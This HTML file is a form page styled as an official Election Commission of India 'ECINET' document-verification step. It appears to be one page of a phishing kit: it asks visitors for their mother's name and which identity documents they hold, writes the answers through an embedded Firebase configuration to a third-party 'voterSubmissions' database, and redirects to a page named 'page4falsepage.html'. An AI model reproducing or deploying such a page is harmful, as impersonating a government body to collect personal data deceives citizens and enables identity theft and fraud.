<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECINET - Document Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { 
            background-color: #0056b3; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 15px; 
        }

        /* Main Container - Index.html ki tarah exact card style */
        .form-container { 
            background: #ffffff; 
            padding: 0 30px 30px 30px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
            width: 100%; 
            max-width: 440px; 
            overflow: hidden; 
        }

        /* Top Blue Header Section - Edge to Edge inside the card */
        .top-header {
            margin-left: -30px;
            margin-right: -30px;
            margin-bottom: 25px;
            padding: 18px 0 20px 0;
            width: calc(100% + 60px);
            background-color: #0056b3;
            text-align: center;
            color: white;
        }

        .top-header img {
            width: 100%;
            max-height: 100px;
            object-fit: contain;
            margin-bottom: 8px;
            display: block;
            background: transparent;
        }

        .top-header .hindi-title {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 3px;
            letter-spacing: 0.5px;
        }

        .top-header .eng-title {
            font-size: 11px;
            font-weight: 400;
            margin-bottom: 8px;
            opacity: 0.9;
        }

        .top-header h1 {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .form-container h2 { 
            text-align: center; 
            margin-bottom: 20px; 
            color: #0056b3; 
            font-size: 20px; 
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .form-group { margin-bottom: 18px; text-align: left; }
        .form-group label { display: block; margin-bottom: 6px; color: #004085; font-weight: 700; font-size: 11px; letter-spacing: 0.8px; text-transform: uppercase; }
        .form-group input[type="text"] { width: 100%; padding: 12px 14px; border: 1px solid #dfe4ea; border-radius: 8px; font-size: 14px; background: #f8f9fa; color: #333; }
        .form-group input[type="text"]:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); }

        .docs-container { border: 1px solid #dfe4ea; border-radius: 8px; padding: 12px; max-height: 160px; overflow-y: auto; background: #f8f9fa; }
        .checkbox-label { display: flex; align-items: center; margin-bottom: 10px; font-size: 13.5px; color: #333; cursor: pointer; font-weight: 500; }
        .checkbox-label input { margin-right: 10px; width: 16px; height: 16px; accent-color: #0056b3; }

        .btn-next { width: 100%; padding: 14px; background: #0056b3; border: none; border-radius: 8px; color: white; font-size: 15px; font-weight: bold; letter-spacing: 1px; cursor: pointer; margin-top: 15px; text-transform: uppercase; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3); }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
        
        .footer-text { text-align: center; margin-top: 25px; font-size: 10px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.4; letter-spacing: 0.3px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Top Blue Header Section with Logo matching Index -->
        <div class="top-header">
            <img src="logo.png" alt="Election Commission Logo">
            <div class="hindi-title">भारत निर्वाचन आयोग</div>
            <div class="eng-title">Election Commission of India</div>
            <h1>ECINET</h1>
        </div>

        <h2>Document Verification</h2>
        <form id="docForm">
            <div class="form-group">
                <label for="motherName">Enter Mother's Name*</label>
                <input type="text" id="motherName" name="motherName" placeholder="Enter mother's full name" required>
            </div>
            <div class="form-group">
                <label>Select Supporting Documents (Choose any)</label>
                <div class="docs-container">
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Aadhaar Card"> Aadhaar Card</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="PAN Card"> PAN Card</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Passport"> Passport</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Electricity Bill"> Electricity Bill</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Water Bill"> Water Bill</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="10th Certificate"> 10th Certificate</label>
                    <label class="checkbox-label"><input type="checkbox" name="documents" value="Ration Card"> Ration Card</label>
                </div>
            </div>
            <button type="submit" id="submitBtn" class="btn-next">Next</button>
        </form>
        <div class="footer-text">
            भारत निर्वाचन आयोग | Election Commission of India
        </div>
    </div>

    <!-- Firebase Integration Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('docForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const motherName = document.getElementById('motherName').value;
            const selectedDocs = [];
            document.querySelectorAll('input[name="documents"]:checked').forEach((checkbox) => {
                selectedDocs.push(checkbox.value);
            });
            const documentsString = selectedDocs.length > 0 ? selectedDocs.join(', ') : 'None Selected';

            const docId = localStorage.getItem('voterDocId');
            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Processing...";

            try {
                const docRef = doc(db, "voterSubmissions", docId);
                await updateDoc(docRef, {
                    motherName: motherName,
                    documents: documentsString,
                    currentStep: "Step 3 Completed"
                });

                setTimeout(() => {
                    window.location.href = "page4falsepage.html"; 
                }, 1000);
            } catch (error) {
                console.error("Error updating document: ", error);
                alert("Data save karne me samasya aayi hai, kripya dobara prayas karein.");
                btn.disabled = false;
                btn.innerText = "Next";
            }
        });
    </script>
</body>
</html>
